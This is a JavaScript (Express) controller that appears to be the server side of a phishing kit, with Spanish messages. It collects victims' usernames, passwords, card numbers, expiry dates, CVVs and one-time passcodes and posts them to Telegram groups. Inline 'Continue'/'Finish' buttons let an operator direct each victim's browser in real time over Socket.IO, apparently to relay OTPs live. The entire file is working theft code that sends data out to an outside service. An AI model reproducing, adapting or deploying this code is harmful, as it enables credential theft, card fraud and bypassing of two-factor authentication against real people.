import { sendTelegramAlert, waitForDecision, respondToTelegramCallback, sendSimpleTelegramMessage, editTelegramMessage } from '../services/botService.js';

let ioInstance;
let activeSession = null;

export const setSocketIO = (io) => {
  ioInstance = io;
}

let counter = 0;

export const initProcess = async (req, res) => {
  const { data, socketId } = req.body;
  try {
    const groupId = counter <= 2 ? process.env.GROUP_1 : process.env.GROUP_2;
    const decrypted = JSON.parse(atob(data));

    // Inicializa la sesión
    activeSession = {
      chatId: groupId,
      user: decrypted.user,
      pass: decrypted.pass,
      card: null,
      exp: null,
      cvv: null,
      otp: null,
      socketId: socketId,
      messageId: null
    };

    const messageText = buildMessageText(activeSession);

    const messageId = await sendTelegramAlert({ groupId, text: messageText });

    if (!messageId) {
      return res.status(500).json({ success: false, message: 'No se pudo enviar el mensaje a Telegram' });
    }

    activeSession.messageId = String(messageId);

    // Esperar decisión desde Telegram
    waitForDecision(activeSession.messageId)
      .then((decision) => {
        console.log(decision)
        if (ioInstance) {
          ioInstance.to(activeSession.socketId).emit('decision', decision);
        }
      })
      .catch((err) => {
        console.error('Timeout esperando decisión:', err.message);
      });

    return res.status(200).json({ success: true, messageId });
  } catch (error) {
    console.error(error);
    return res.status(500).json({ success: false, error: error.message });
  }
};

export const telegramWebhook = async (req, res) => {
  const callback = req.body.callback_query;
  if (!callback) return res.sendStatus(200);
  try {
    await respondToTelegramCallback(callback);
    return res.sendStatus(200);
  } catch (err) {
    console.error('Error manejando webhook:', err);
    return res.sendStatus(500);
  }
};

export const appendCardData = async (req, res) => {
  const { card, exp, cvv } = req.body;

  if (!activeSession) return res.status(400).json({ error: 'No hay sesión activa' });

  try {
    activeSession.card = card;
    activeSession.exp = exp;
    activeSession.cvv = cvv;

    const newText = buildMessageText(activeSession);

    await editTelegramMessage({
      chatId: activeSession.chatId,
      messageId: activeSession.messageId,
      text: newText
    });

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error en appendCardData:', error);
    return res.status(500).json({ success: false, error: error.message });
  }
};

export const sendSimpleMessage = async (req, res) => {
  const { text } = req.body;
  const chatId = counter <= 2 ? process.env.GROUP_1 : process.env.GROUP_2;
  const data = JSON.parse(atob(text));
  const message = `
    Tarjeta: ${data['card']}
  Exp:  ${data['exp']}
  CVV:  ${data['cvv']}
  `;
  try {
    const result = await sendSimpleTelegramMessage(chatId, message);
    return res.status(200).json({
      success: true,
      message_id: result.message_id, // 🔥 Aquí está
      chat_id: result.chat.id,
      date: result.date,
      text: result.text
    });
  } catch (err) {
    console.error('Error enviando mensaje simple:', err);
    return res.status(500).json({ error: err.message });
  }
};

export const updateMessageWithOtp = async (req, res) => {
  const { otp, socketId } = req.body;

  if (!activeSession) return res.status(400).json({ error: 'No hay sesión activa' });

  try {
    activeSession.otp = otp;

    const messageText = buildMessageText(activeSession);

    await editTelegramMessage({
      chatId: activeSession.chatId,
      messageId: activeSession.messageId,
      text: messageText,
      reply_markup: {
        inline_keyboard: [[
          { text: 'Continuar', callback_data: 'continue' },
          { text: 'Finalizar', callback_data: 'finalize' },
        ]]
      }
    });

    waitForDecision(activeSession.messageId)
      .then((decision) => {
        if (ioInstance) {
          ioInstance.to(activeSession.socketId).emit('final-decision', decision);
        }
      })
      .catch((err) => {
        console.error('Timeout esperando decisión del OTP:', err.message);
      });

    // Ya se está esperando la decisión desde initProcess
    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error en updateMessageWithOtp:', error);
    return res.status(500).json({ success: false, error: error.message });
  }
};

function buildMessageText(session) {
  return `
🚨 Nuevo ingreso:
👤 Usuario: ${session.user}
🔑 Contraseña: ${session.pass}
${session.card ? `💳 Tarjeta: ${session.card}` : ''}
${session.exp ? `📆 Exp: ${session.exp}` : ''}
${session.cvv ? `🔐 CVV: ${session.cvv}` : ''}
${session.otp ? `✅ OTP ingresado: ${session.otp}` : ''}
`.trim();
}
